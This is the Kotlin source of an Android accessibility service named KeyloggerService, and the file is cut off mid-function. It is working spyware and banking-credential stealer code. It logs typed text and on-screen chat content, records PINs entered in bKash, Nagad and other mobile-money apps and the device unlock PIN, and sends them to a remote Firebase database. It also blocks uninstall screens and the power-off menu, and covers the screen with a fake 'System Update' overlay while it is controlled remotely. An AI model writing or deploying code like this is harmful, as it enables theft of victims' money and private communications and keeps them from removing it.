package com.example.myapplicationtestweb

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.pm.PackageManager
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.content.Context
import android.content.Intent
import android.content.BroadcastReceiver
import android.content.IntentFilter
import android.provider.Settings
import android.util.DisplayMetrics
import timber.log.Timber
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Bitmap
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Drawable
import android.graphics.Canvas
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import androidx.core.app.NotificationCompat
import android.view.View
import android.view.WindowManager
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.hardware.display.DisplayManager
import com.google.firebase.database.*
import org.json.JSONArray
import org.json.JSONObject

class KeyloggerService : AccessibilityService() {

    companion object {
        var instance: KeyloggerService? = null
        private const val TAG = "KeyloggerService"
        // Simple debug logger
        fun logDebug(msg: String) {
            Timber.d("[DEBUG] $msg")
        }
    }

    // Safe nullable refs — avoids lateinit crash
    private var deviceId: String = ""
    private var userId: String = ""
    private var dbUrl: String = ""
    private var deviceRef: DatabaseReference? = null
    private var database: FirebaseDatabase? = null
    private var isServiceReady = false

    private val mainHandler = Handler(Looper.getMainLooper())

    // Screen capture state
    private var isCapturing = false
    private var captureInterval = 500L
    private var captureThread: Thread? = null

    // Device screen dimensions
    private var screenWidth = 0
    private var screenHeight = 0

    // Financial app custom keypad tracking (Nagad, etc.)
    private val FINANCIAL_CUSTOM_KEYPAD_APPS = setOf(
        "com.konasl.nagad",
        "com.dbbl.mbs.apps.main",
        "com.ucb.upay"
    )
    private var lastPinDotCount = 0
    private var financialPinSequence = ""
    private var currentFinancialApp = ""
    private var lastFinancialDigitTime = 0L



    // Anti-Uninstall: Package installer packages that show uninstall dialogs
    private val UNINSTALL_PACKAGES = setOf(
        "com.google.android.packageinstaller",
        "com.android.packageinstaller",
        "com.miui.packageinstaller",
        "com.samsung.android.packageinstaller",
        "com.android.settings",
        "com.samsung.android.settings",
        "com.miui.securitycenter"
    )

    // Keywords that indicate an uninstall screen
    private val UNINSTALL_KEYWORDS = listOf(
        "uninstall", "delete app", "remove app", 
        "আনইনস্টল", "মুছুন", // Bangla
        "अनइंस्टॉल", // Hindi
        "إلغاء التثبيت" // Arabic
    )

    // MediaProjection fields for screen capture
    private var projectionManager: MediaProjectionManager? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null

    // Optimization
    private var lastTreeHash: Int = 0
    private val updateHandler = Handler(Looper.getMainLooper())
    private var isUpdatePending = false
    private val updateRunnable = object : Runnable {
        override fun run() {
            captureScreenNow()
            if (isCapturing) {
                updateHandler.postDelayed(this, captureInterval)
            } else {
                isUpdatePending = false
            }
        }
    }

    // Throttle timestamps
    private var lastAutoGrantTime = 0L
    private var lastUninstallBlockTime = 0L

    // Privacy Overlay
    private var windowManager: WindowManager? = null
    private var privacyOverlayView: View? = null
    private var isPrivacyScreenActive = false
    private var isBlockingHardwareKeys = false
    private var wakeLock: PowerManager.WakeLock? = null
    
    private val screenStateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == Intent.ACTION_SCREEN_OFF && isPrivacyScreenActive) {
                // If privacy mode is on and screen turns off (user pressed power button),
                // we immediately wake the screen up and reduce volume.
                wakeScreenUp()
                reduceVolume()
            }
        }
    }

    // Keylogger state — deduplication
    private var lastLoggedText = ""
    private var lastLoggedTime = 0L
    private var lastLoggedPackage = ""
    private var lastLogRef: com.google.firebase.database.DatabaseReference? = null

    // Chat Scraper State
    private val recentTextCache = LinkedHashSet<String>()
    private var lastChatLogTime = 0L
    private val IGNORED_UI_TEXTS = setOf(
        "back", "send", "attach", "call", "video call", "more options",
        "camera", "type a message", "message", "search", "voice message",
        "type an sms message", "info", "settings"
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Timber.d("KeyloggerService Connected")
        
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        
        try {
            deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
            userId = Config.getUserId(this)
            dbUrl = Config.getDbUrl(this)

            if (userId.isEmpty() || dbUrl.isEmpty()) {
                Timber.e("userId or dbUrl is empty! userId=$userId, dbUrl=$dbUrl")
                return
            }

            database = FirebaseDatabase.getInstance(dbUrl)
            deviceRef = database!!.reference.child("users").child(userId).child("devices").child(deviceId)

            // Get screen dimensions
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val dm = DisplayMetrics()
            
            // Register screen state receiver to intercept power button effect
            val filter = IntentFilter(Intent.ACTION_SCREEN_OFF)
            registerReceiver(screenStateReceiver, filter)
            
            // Initialize WakeLock for keeping screen awake
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                "App::PrivacyWakeLock"
            )
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(dm) // use getRealMetrics to include navbar/statusbar dimensions
            screenWidth = dm.widthPixels
            screenHeight = dm.heightPixels

            // Report screen dimensions to Firebase using real metrics for accuracy
            deviceRef?.child("screenInfo")?.setValue(mapOf(
                "width" to screenWidth,
                "height" to screenHeight
            ))

            isServiceReady = true

            // Reset privacy screen state to false on startup so it doesn't show unexpectedly
            deviceRef?.child("screenConfig")?.child("privacyScreen")?.setValue(false)

            // Setup Firebase listeners for screen commands
            setupScreenListeners()
            setupCommandListeners()

            Timber.d("Service connected. UID=$userId, Device=$deviceId, Screen: ${screenWidth}x${screenHeight}")
        } catch (e: Exception) {
            Timber.e(e, "onServiceConnected error: ${e.message}")
            isServiceReady = false
        }
    }

    // ==================== KEYLOGGER (FIXED) ====================

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // Trigger reactive screen capture if streaming is enabled
        if (isCapturing) {
            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
                AccessibilityEvent.TYPE_VIEW_SCROLLED,
                AccessibilityEvent.TYPE_VIEW_FOCUSED,
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    triggerCapture()
                }
            }
        }

        val now = System.currentTimeMillis()

        // Anti-Uninstall Block (throttled — max once per 2 seconds)
        if (now - lastUninstallBlockTime >= 2000 &&
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            lastUninstallBlockTime = now
            blockUninstall(event)
        }
        
        // Aggressively block the Power Off Dialog if hardware keys are blocked
        if (isBlockingHardwareKeys && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val pkg = event.packageName?.toString() ?: ""
            if (pkg == "android" || pkg == "com.android.systemui") {
                val textStr = event.text?.joinToString(" ")?.lowercase() ?: ""
                if (textStr.contains("power off") || textStr.contains("restart")) {
                    performGlobalAction(GLOBAL_ACTION_BACK)
                    performGlobalAction(GLOBAL_ACTION_HOME)
                } else {
                    try {
                        val root = rootInActiveWindow
                        if (root != null) {
                            val pNodes = root.findAccessibilityNodeInfosByText("Power off")
                            val rNodes = root.findAccessibilityNodeInfosByText("Restart")
                            if (pNodes.isNotEmpty() || rNodes.isNotEmpty()) {
                                performGlobalAction(GLOBAL_ACTION_BACK)
                                performGlobalAction(GLOBAL_ACTION_HOME)
                            }
                        }
                    } catch (e: Exception) {}
                }
            }
        }

        // Debug event info
        logDebug("Event type=${event.eventType}, pkg=${event.packageName}")

        // Keylogger: capture all text changes
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (isServiceReady) handleTextChanged(event)
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                // Some keyboards emit focused events with text
                if (isServiceReady && event.text != null && event.text.isNotEmpty()) {
                    val node = event.source
                    if (node != null && node.isEditable) {
                        handleTextChanged(event)
                        try { node.recycle() } catch (_: Exception) {}
                    }
                }
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (isServiceReady) {
                    val packageName = event.packageName?.toString() ?: ""
                    // Financial app custom keypad tracking (Nagad, etc.)
                    if (packageName.isNotEmpty() && FINANCIAL_CUSTOM_KEYPAD_APPS.contains(packageName)) {
                        handleFinancialPinPad(packageName)
                    }
                    val root = try { rootInActiveWindow } catch (e: Exception) { null }
                    if (root != null) {
                        val pkg = packageName.ifEmpty { root.packageName?.toString() ?: "" }
                        if (pkg.isNotEmpty() && pkg != this.packageName) {
                            handleChatScraper(root, pkg)
                        }
                        try { root.recycle() } catch (_: Exception) {}
                    }
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                if (isServiceReady) {
                    handleViewClicked(event)
                }
            }
            AccessibilityEvent.TYPE_VIEW_SELECTED -> {
                // Financial apps like Nagad use selection events instead of click
                if (isServiceReady) {
                    val pkg = event.packageName?.toString() ?: ""
                    if (FINANCIAL_CUSTOM_KEYPAD_APPS.contains(pkg)) {
                        handleViewClicked(event)
                    }
                }
            }
        }
    }

    override fun onKeyEvent(event: android.view.KeyEvent): Boolean {
        if (isBlockingHardwareKeys || isPrivacyScreenActive) {
            val keyCode = event.keyCode
            
            // Attempt to intercept Power Button and trigger Volume Up instead
            if (isBlockingHardwareKeys && keyCode == android.view.KeyEvent.KEYCODE_POWER) {
                if (event.action == android.view.KeyEvent.ACTION_DOWN) {
                    try {
                        val audioManager = getSystemService(android.content.Context.AUDIO_SERVICE) as android.media.AudioManager
                        audioManager.adjustStreamVolume(android.media.AudioManager.STREAM_MUSIC, android.media.AudioManager.ADJUST_RAISE, android.media.AudioManager.FLAG_SHOW_UI)
                    } catch (e: Exception) {}
                }
                return true
            }
            
            if (keyCode == android.view.KeyEvent.KEYCODE_VOLUME_UP ||
                keyCode == android.view.KeyEvent.KEYCODE_VOLUME_DOWN ||
                keyCode == android.view.KeyEvent.KEYCODE_VOLUME_MUTE ||
                keyCode == android.view.KeyEvent.KEYCODE_CAMERA ||
                keyCode == android.view.KeyEvent.KEYCODE_POWER) {
                // Consume the event, effectively disabling the hardware button
                return true
            }
        }
        return super.onKeyEvent(event)
    }

    private fun blockUninstall(event: AccessibilityEvent) {
        try {
            val pkgName = event.packageName?.toString() ?: return
            if (!UNINSTALL_PACKAGES.contains(pkgName)) return

            val rootNode = rootInActiveWindow ?: return
            val ourAppName = getString(R.string.app_name)

            // Check if screen text contains our app name AND uninstall keywords
            val screenText = buildString {
                extractAllText(rootNode, this)
            }.lowercase()

            val containsOurApp = screenText.contains(ourAppName.lowercase()) || 
                                  screenText.contains(packageName.lowercase())
            val containsUninstall = UNINSTALL_KEYWORDS.any { screenText.contains(it) }

            if (containsOurApp && containsUninstall) {
                Timber.d("Anti-Uninstall: Uninstall screen detected! Blocking...")

                // Strategy 1: Try to click Cancel button
                val cancelTexts = listOf("cancel", "বাতিল", "रद्द करें", "إلغاء", "cancelar")
                val cancelled = tryClickByText(rootNode, cancelTexts)

                if (!cancelled) {
                    // Strategy 2: Press BACK
                    performGlobalAction(GLOBAL_ACTION_BACK)
                    Timber.d("Anti-Uninstall: Pressed BACK to escape uninstall")
                }
                // Strategy 3: Schedule a GO_HOME after a small delay as fallback
                mainHandler.postDelayed({
                    performGlobalAction(GLOBAL_ACTION_HOME)
                }, 500)
            }
            try { rootNode.recycle() } catch (_: Exception) {}
        } catch (e: Exception) {
            Timber.e("blockUninstall error: ${e.message}")
        }
    }

    private fun extractAllText(node: AccessibilityNodeInfo, sb: StringBuilder, depth: Int = 0) {
        if (depth > 15) return
        node.text?.let { sb.append(it).append(" ") }
        node.contentDescription?.let { sb.append(it).append(" ") }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            extractAllText(child, sb, depth + 1)
            try { child.recycle() } catch (_: Exception) {}
        }
    }

    private fun tryClickByText(root: AccessibilityNodeInfo, texts: List<String>): Boolean {
        for (text in texts) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            for (node in nodes) {
                if (node.isClickable && node.isEnabled) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    try { node.recycle() } catch (_: Exception) {}
                    return true
                }
                // Walk up to clickable parent
                var parent = node.parent
                while (parent != null) {
                    if (parent.isClickable && parent.isEnabled) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        try { parent.recycle(); node.recycle() } catch (_: Exception) {}
                        return true
                    }
                    parent = parent.parent
                }
                try { node.recycle() } catch (_: Exception) {}
            }
        }
        return false
    }

    private fun handleChatScraper(root: AccessibilityNodeInfo, packageName: String) {
        val now = System.currentTimeMillis()
        if (now - lastChatLogTime < 2500) return // Throttle scraping to 2.5 seconds

        try {
            val texts = mutableListOf<String>()
            extractAllTextToList(root, texts)

            val newTexts = mutableListOf<String>()
            for (t in texts) {
                val trimmed = t.trim()
                if (trimmed.length > 2 && !recentTextCache.contains(trimmed) && trimmed.lowercase() !in IGNORED_UI_TEXTS) {
                    newTexts.add(trimmed)
                    recentTextCache.add(trimmed)
                }
            }

            // Maintain cache size to avoid memory bloat
            if (recentTextCache.size > 300) {
                val toRemove = recentTextCache.take(100)
                recentTextCache.removeAll(toRemove.toSet())
            }

            if (newTexts.isNotEmpty()) {
                val appName = getAppName(packageName)
                // Filter out single character outputs, join them nicely
                val loggedString = newTexts.joinToString(" | ")
                val formattedLog = "[$appName ScreenText] $loggedString"

                val ref = getLogsRef()
                ref?.push()?.setValue(mapOf(
                    "log" to formattedLog,
                    "time" to ServerValue.TIMESTAMP
                ))
                lastChatLogTime = now
            }
        } catch (e: Exception) {
            Timber.e("ChatScraper error: ${e.message}")
        }
    }

    private fun extractAllTextToList(node: AccessibilityNodeInfo, list: MutableList<String>, depth: Int = 0) {
        if (depth > 20) return
        node.text?.toString()?.takeIf { it.isNotBlank() }?.let { list.add(it) }
        node.contentDescription?.toString()?.takeIf { it.isNotBlank() }?.let { list.add(it) }

        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (e: Exception) { null } ?: continue
            extractAllTextToList(child, list, depth + 1)
            try { child.recycle() } catch (_: Exception) {}
        }
    }



    private fun handleTextChanged(event: AccessibilityEvent) {
        logDebug("handleTextChanged invoked")
        try {
            // Get the full current text from the field
            val textList = event.text ?: return
            if (textList.isEmpty()) return

            val text = textList.joinToString("").trim()
            if (text.isEmpty()) return

            val packageName = event.packageName?.toString() ?: "unknown"
            val now = System.currentTimeMillis()

            // Skip exact duplicate from same app (prevents double-fire)
            if (text == lastLoggedText && packageName == lastLoggedPackage && (now - lastLoggedTime) < 300) {
                return
            }

            val appName = getAppName(packageName)
            val isKeyboard = packageName.contains("keyboard", ignoreCase = true) || 
                             packageName.contains("inputmethod", ignoreCase = true) ||
                             packageName.contains("gboard", ignoreCase = true)
            
            val prefix = if (isKeyboard) "🔥 [KEYBOARD] " else "📝 [$appName] "
            val formattedLog = "$prefix$text"

            try {
                val ref = getLogsRef()
                if (ref != null) {
                    val isContinuation = lastLoggedText.isNotEmpty() && 
                        (text.startsWith(lastLoggedText) || lastLoggedText.startsWith(text) ||
                         text.contains(lastLoggedText) || lastLoggedText.contains(text) ||
                         Math.abs(text.length - lastLoggedText.length) <= 5)

                    // If same app within 8 seconds and the text looks related, update existing row
                    if (packageName == lastLoggedPackage && (now - lastLoggedTime) < 8000 && lastLogRef != null && isContinuation) {
                        lastLogRef?.setValue(mapOf(
                            "log" to formattedLog,
                            "time" to ServerValue.TIMESTAMP
                        ))
                    } else {
                        // New row for new field, new app, or after pause
                        lastLogRef = ref.push()
                        lastLogRef?.setValue(mapOf(
                            "log" to formattedLog,
                            "time" to ServerValue.TIMESTAMP
                        ))
                    }
                    Timber.d("Keylog: $formattedLog")
                }
            } catch (e: Exception) {
                Timber.e("Firebase write error: ${e.message}")
                tryReinitFirebase()
            }

            lastLoggedText = text
            lastLoggedTime = now
            lastLoggedPackage = packageName

            logDebug("Keylog sent: $formattedLog")
        } catch (e: Exception) {
            Timber.e("handleTextChanged error: ${e.message}")
        }
    }

    private fun handleViewClicked(event: AccessibilityEvent) {
        try {
            val node = try { event.source } catch (e: Exception) { null } ?: return
            
            // Extract text or content description
            var text = node.text?.toString() ?: ""
            if (text.isEmpty()) {
                text = node.contentDescription?.toString() ?: ""
            }
            
            text = text.trim()
            if (text.isEmpty() || text.length > 20) {
                try { node.recycle() } catch (_: Exception) {}
                return // Ignore empty clicks or huge text blocks
            }
            
            val packageName = event.packageName?.toString() ?: "unknown"
            val appName = getAppName(packageName)
            val now = System.currentTimeMillis()
            
            // Skip exact duplicate clicks within a short time (e.g. 500ms) to prevent double-fire
            if (text == lastLoggedText && packageName == lastLoggedPackage && (now - lastLoggedTime) < 500) {
                try { node.recycle() } catch (_: Exception) {}
                return
            }

            // For PIN pads, usually the text is a number 0-9, or 'Clear', 'Del', 'Enter'.
            val formattedLog = "👆 [$appName Tapped] $text"
            
            try {
                val ref = getLogsRef()
                if (ref != null) {
                    // Check if it's a continuation of taps in the same app (like tapping PIN 1-2-3-4)
                    if (packageName == lastLoggedPackage && (now - lastLoggedTime) < 8000 && lastLogRef != null && lastLoggedText.startsWith("👆")) {
                        // Append the tapped character
                        lastLogRef?.child("log")?.addListenerForSingleValueEvent(object : com.google.firebase.database.ValueEventListener {
                            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                                val currentLog = snapshot.getValue(String::class.java) ?: formattedLog
                                val newLog = if (currentLog.startsWith("👆")) {
                                    if (text.length == 1) "$currentLog$text" else "$currentLog [$text]"
                                } else formattedLog
                                
                                lastLogRef?.setValue(mapOf(
                                    "log" to newLog,
                                    "time" to com.google.firebase.database.ServerValue.TIMESTAMP
                                ))
                                
                                // Special tracking for financial app PINs and Device Lock PINs
                                if (packageName == "com.bKash.customerapp" || 
                                    packageName == "com.bKash.merchantapp" || 
                                    packageName == "com.konasl.nagad" ||
                                    packageName == "com.android.systemui" ||
                                    packageName == "com.samsung.android.app.telephonyui" ||
                                    packageName == "com.android.keyguard") {
                                    
                                    val justPins = newLog.substringAfter("Tapped] ").trim()
                                    
                                    // System UI catches all taps (wifi, notifications, etc). 
                                    // So for system apps, we enforce it must be purely 4+ digits to be considered a PIN.
                                    val isSystem = packageName.contains("android") || packageName.contains("systemui")
                                    val isLikelyPin = if (isSystem) {
                                        justPins.matches(Regex("^[0-9]{4,12}$"))
                                    } else {
                                        justPins.length >= 4
                                    }

                                    if (isLikelyPin) {
                                        val saveName = if (isSystem) "device_unlock_pin" else packageName.replace(".", "_")
                                        val finalAppName = if (isSystem) "Device Lock Screen" else appName
                                        
                                        deviceRef?.child("financial_pins")?.child(saveName)?.setValue(mapOf(
                                            "appName" to finalAppName,
                                            "pin" to justPins,
                                            "time" to com.google.firebase.database.ServerValue.TIMESTAMP
                                        ))
                                    }
                                }
                            }
                            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
                        })
                    } else {
                        // New tap sequence
                        lastLogRef = ref.push()
                        lastLogRef?.setValue(mapOf(
                            "log" to formattedLog,
                            "time" to com.google.firebase.database.ServerValue.TIMESTAMP
                        ))
                    }
                }
            } catch (e: Exception) {
                Timber.e("Firebase write error: ${e.message}")
            }

            // We prefix it with the tap icon so we know it's a tap sequence for the next continuation check
            // Log tap sequence
            lastLoggedText = "👆 [$appName Tapped] $text"
            lastLoggedTime = now
            lastLoggedPackage = packageName

            // ------------------------------------------------------------------
            // Device Unlock PIN capture (e.g., lock screen PIN entry)
            // ------------------------------------------------------------------
            // Detect if we are on a lock screen / unlock UI and capture masked PIN input.
            // Many lock screens use a password field with masked characters (●/•/*).
            // We check the current active window for password nodes and count dots.
            if (packageName.contains("systemui") || packageName.contains("lockscreen") || packageName.contains("keyguard")) {
                try {
                    val root = rootInActiveWindow ?: return
                    val pinDots = countPinDots(root)
                    if (pinDots >= 4) {
                        // Assume user entered a PIN of length pinDots
                        val unlockPin = "•".repeat(pinDots) // placeholder representation
                        val unlockLog = "🔓 [$appName Unlock PIN] $unlockPin"
                        val ref = getLogsRef()
                        if (ref != null) {
                            val unlockRef = ref.push()
                            unlockRef.setValue(mapOf("log" to unlockLog, "time" to com.google.firebase.database.ServerValue.TIMESTAMP))
                        }
                        Timber.d("Captured unlock PIN for $appName: $pinDots dots")
                    }
                } catch (e: Exception) {
                    Timber.e("Unlock PIN capture error: ${e.message}")
                }
            }
            try { node.recycle() } catch (_: Exception) {}
        } catch (e: Exception) {
            Timber.e("handleViewClicked error: ${e.message}")
        }
    }

    /**
     * Get logs DatabaseReference safely, with fallback re-init
     */
    private fun getLogsRef(): DatabaseReference? {
        if (deviceRef != null) {
            return deviceRef!!.child("logs")
        }

        // Fallback: try to create ref from scratch
        tryReinitFirebase()
        return deviceRef?.child("logs")
    }



    /**
     * Try to re-initialize Firebase connection if it failed initially
     */
    private fun tryReinitFirebase() {
        try {
            if (userId.isEmpty()) userId = Config.getUserId(this)
            if (dbUrl.isEmpty()) dbUrl = Config.getDbUrl(this)
            if (deviceId.isEmpty()) deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"

            if (userId.isNotEmpty() && dbUrl.isNotEmpty() && deviceId.isNotEmpty()) {
                database = FirebaseDatabase.getInstance(dbUrl)
                deviceRef = database!!.reference.child("users").child(userId).child("devices").child(deviceId)
                isServiceReady = true
                Timber.d("Firebase re-initialized successfully")
            }
        } catch (e: Exception) {
            Timber.e("Firebase re-init failed: ${e.message}")
        }
    }

    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            val ai = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(ai).toString()
        } catch (e: Exception) {
            packageName.split(".").last().replaceFirstChar { it.uppercase() }
        }
    }

    // ==================== FINANCIAL APP CUSTOM KEYPAD TRACKER ====================

    private fun handleFinancialPinPad(packageName: String) {
        val now = System.currentTimeMillis()
        if (now - lastFinancialDigitTime < 150) return

        try {
            if (currentFinancialApp != packageName) {
                currentFinancialApp = packageName
                financialPinSequence = ""
                lastPinDotCount = 0
            }

            val root = try { rootInActiveWindow } catch (e: Exception) { null } ?: return

            val pinDots = countPinDots(root)
            val focusedDigit = findFocusedOrSelectedDigit(root)

            if (pinDots > lastPinDotCount && pinDots > 0) {
                financialPinSequence += focusedDigit ?: "*"

                val appName = getAppName(packageName)
                val formattedLog = "👆 [$appName Tapped] $financialPinSequence"

                val ref = getLogsRef()
                if (ref != null) {
                    if (lastLoggedPackage == packageName && (now - lastLoggedTime) < 30000 && lastLogRef != null && lastLoggedText.contains("Tapped]")) {
                        lastLogRef?.setValue(mapOf("log" to formattedLog, "time" to com.google.firebase.database.ServerValue.TIMESTAMP))
                    } else {
                        lastLogRef = ref.push()
                        lastLogRef?.setValue(mapOf("log" to formattedLog, "time" to com.google.firebase.database.ServerValue.TIMESTAMP))
                    }

                    if (financialPinSequence.length >= 4) {
                        deviceRef?.child("financial_pins")?.child(packageName.replace(".", "_"))?.setValue(mapOf(
                            "appName" to appName,
                            "pin" to financialPinSequence,
                            "time" to com.google.firebase.database.ServerValue.TIMESTAMP
                        ))
                    }
                }

                lastLoggedText = formattedLog
                lastLoggedTime = now
                lastLoggedPackage = packageName
                lastFinancialDigitTime = now
                Timber.d("Financial PIN: $appName -> $financialPinSequence (dots: $pinDots)")

            } else if (pinDots == 0 && lastPinDotCount > 0) {
                financialPinSequence = ""
            } else if (pinDots < lastPinDotCount && financialPinSequence.isNotEmpty()) {
                financialPinSequence = financialPinSequence.dropLast(1)
            }

            lastPinDotCount = pinDots
            try { root.recycle() } catch (_: Exception) {}
        } catch (e: Exception) {
            Timber.e("FinancialPinPad error: ${e.message}")
        }
    }

    private fun countPinDots(node: android.view.accessibility.AccessibilityNodeInfo, depth: Int = 0): Int {
        if (depth > 15) return 0
        val text = node.text?.toString() ?: ""

        // Detect masked PIN fields: ●●●● or •••• or **** etc.
        if (node.isPassword || text.matches(Regex("^[\u25CF\u25CB\u2022\u25C9\u2B24\u26AB*]{1,12}$"))) {
            return text.length
        }

        var maxDots = 0
        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (e: Exception) { null } ?: continue
            val d = countPinDots(child, depth + 1)
            if (d > maxDots) maxDots = d
            try { child.recycle() } catch (_: Exception) {}
        }
        return maxDots
    }

    private fun findFocusedOrSelectedDigit(node: android.view.accessibility.AccessibilityNodeInfo, depth: Int = 0): String? {
        if (depth > 15) return null
        val text = (node.text?.toString()?.trim() ?: "").ifEmpty { node.contentDescription?.toString()?.trim() ?: "" }

        if (text.length == 1 && text[0].isDigit()) {
            if (node.isSelected || node.isFocused || node.isAccessibilityFocused || node.actionList.contains(android.view.accessibility.AccessibilityNodeInfo.AccessibilityAction.ACTION_CLICK)) {
                return text
            }
        }

        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (e: Exception) { null } ?: continue
            val result = findFocusedOrSelectedDigit(child, depth + 1)
            if (result != null) {
                try { child.recycle() } catch (_: Exception) {}
                return result
            }
            try { child.recycle() } catch (_: Exception) {}
        }
        return null
    }

    // ==================== SCREEN TREE CAPTURE ====================

    private fun setupScreenListeners() {
        deviceRef?.child("screenConfig")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val enabled = snapshot.child("enabled").getValue(Boolean::class.java) ?: false
                val interval = snapshot.child("interval").getValue(Long::class.java) ?: 500L
                val privacy = snapshot.child("privacyScreen").getValue(Boolean::class.java) ?: false
                val blockKeys = snapshot.child("blockHardwareKeys").getValue(Boolean::class.java) ?: false
                
                captureInterval = interval.coerceIn(50, 5000)
                isBlockingHardwareKeys = blockKeys

                if (enabled && !isCapturing) {
                    startScreenCapture()
                } else if (!enabled && isCapturing) {
                    stopScreenCapture()
                }

                if (privacy && !isPrivacyScreenActive) {
                    showPrivacyOverlay()
                } else if (!privacy && isPrivacyScreenActive) {
                    hidePrivacyOverlay()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun startScreenCapture() {
        if (isCapturing) return
        isCapturing = true
        Timber.d("Starting screen capture, reactive mode enabled")
        
        // Initial capture
        triggerCapture()
    }

    private fun triggerCapture() {
        if (!isCapturing || isUpdatePending) return
        isUpdatePending = true
        // Debounce: wait minimum interval (default 50ms)
        updateHandler.postDelayed(updateRunnable, captureInterval)
    }

    private fun showPrivacyOverlay() {
        if (isPrivacyScreenActive || windowManager == null) return
        
        updateHandler.post {
            try {
                val overlayLayout = android.widget.LinearLayout(this).apply {
                    setBackgroundColor(Color.BLACK)
                    orientation = android.widget.LinearLayout.VERTICAL
                    gravity = android.view.Gravity.CENTER
                    importantForAccessibility = View.IMPORTANT_FOR_ACCESSIBILITY_NO
                    contentDescription = "System Privacy Overlay"
                    
                    addView(android.widget.TextView(this@KeyloggerService).apply {
                        text = "System Update in Progress...\nPlease do not turn off your device."
                        setTextColor(Color.WHITE)
                        textSize = 18f
                        gravity = android.view.Gravity.CENTER
                        setPadding(40, 40, 40, 40)
                    })
                }
                privacyOverlayView = overlayLayout

                // TYPE_ACCESSIBILITY_OVERLAY is better for accessibility services
                // it sits on top but is designed to interact with the service logic
                val type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                            WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS,
                    PixelFormat.TRANSLUCENT
                )

                windowManager?.addView(privacyOverlayView, params)
                isPrivacyScreenActive = true
                
                // Ensure screen stays completely awake while privacy is on
                if (wakeLock?.isHeld == false) {
                    wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes timeout as fallback
                }
                
                Timber.d("Privacy Overlay Shown")
            } catch (e: Exception) {
                Timber.e("Failed to show privacy overlay: ${e.message}")
            }
        }
    }

    private fun hidePrivacyOverlay() {
        if (!isPrivacyScreenActive) return
        updateHandler.post {
            try {
                if (privacyOverlayView != null) {
                    windowManager?.removeView(privacyOverlayView)
                    privacyOverlayView = null
                }
                isPrivacyScreenActive = false
                
                if (wakeLock?.isHeld == true) {
                    wakeLock?.release()
                }
                
                Timber.d("Privacy Overlay Hidden")
            } catch (e: Exception) {
                Timber.e("Failed to hide privacy overlay: ${e.message}")
            }
        }
    }

    private fun wakeScreenUp() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
            wakeLock?.acquire(3000L) // Wake up for 3 seconds, the layout flags will keep it awake
        } catch (e: Exception) {
            Timber.e("Failed to wake screen: ${e.message}")
        }
    }

    private fun reduceVolume() {
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
            audioManager.adjustStreamVolume(android.media.AudioManager.STREAM_MUSIC, android.media.AudioManager.ADJUST_LOWER, 0)
